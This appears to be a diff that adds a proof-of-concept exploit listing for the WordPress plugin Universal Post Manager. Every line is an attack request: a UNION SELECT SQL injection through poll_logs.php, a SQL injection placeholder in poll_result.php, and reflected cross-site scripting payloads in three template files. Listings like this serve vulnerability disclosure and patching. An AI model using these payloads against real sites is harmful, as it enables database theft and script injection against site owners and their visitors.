@@ -1,0 +1,11 @@
+GET /wp-content/plugins/universal-post-manager/includes/poll_logs.php?qid=1%20union%20select%201,2,3,4,version(),6,7%20--%201
+Referer: http://www.example.com
+
+GET /wp-content/plugins/universal-post-manager/includes/poll_result.php?do=result&amp;PID=SQL_CODE
+Referer: http://www.example.com
+
+http://www.example.com/wp-content/plugins/universal-post-manager/template/email_screen_1.php?unit=1&amp;num=%27%29%3E%3Cscript%3Ealert%28%22XSS%22%29;%3C/script%3E
+
+http://www.example.com/wp-content/plugins/universal-post-manager/template/bookmarks_slider_h.php?number=%3Cscript%3Ealert%28%22XSS%22%29;%3C/script%3E
+
+http://wordpress/wp-content/plugins/universal-post-manager/template/email_screen_2.php?unit=1&amp;num=%22%3E%3Cscript%3Ealert%28%22XSS%22%29;%3C/script%3E
